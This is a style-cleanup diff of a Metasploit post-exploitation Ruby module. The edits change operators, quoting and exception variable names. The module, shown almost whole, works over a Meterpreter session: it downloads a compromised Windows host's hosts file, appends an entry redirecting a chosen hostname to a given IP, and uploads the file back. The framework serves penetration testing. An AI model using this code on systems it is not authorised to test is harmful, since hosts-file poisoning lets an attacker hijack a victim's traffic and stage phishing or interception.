@@ -3,6 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'English'
 class MetasploitModule < Msf::Post
 
   def initialize(info = {})
@@ -43,8 +44,8 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if datastore['IP'].nil? or datastore['DOMAIN'].nil?
-      print_error("Please specify both DOMAIN and IP")
+    if datastore['IP'].nil? || datastore['DOMAIN'].nil?
+      print_error('Please specify both DOMAIN and IP')
       return
     end
 
@@ -59,20 +60,20 @@ class MetasploitModule < Msf::Post
     begin
       # Download the remote file to the temporary file
       client.fs.file.download_file(temp_path, 'C:\\WINDOWS\\System32\\drivers\\etc\\hosts')
-    rescue Rex::Post::Meterpreter::RequestError => re
+    rescue Rex::Post::Meterpreter::RequestError => e
       # If the file doesn't exist, then it's okay.  Otherwise, throw the
       # error.
-      if re.result != 2
-        raise $!
+      if e.result != 2
+        raise $ERROR_INFO
       end
     end
 
     print_status("Inserting hosts file entry pointing #{hostname} to #{ip}..")
     hostsfile = ::File.open(temp_path, 'ab')
     hostsfile.write("\r\n#{ip}\t#{hostname}")
-    hostsfile.close()
+    hostsfile.close
 
     client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', temp_path)
-    print_good("Done!")
+    print_good('Done!')
   end
 end
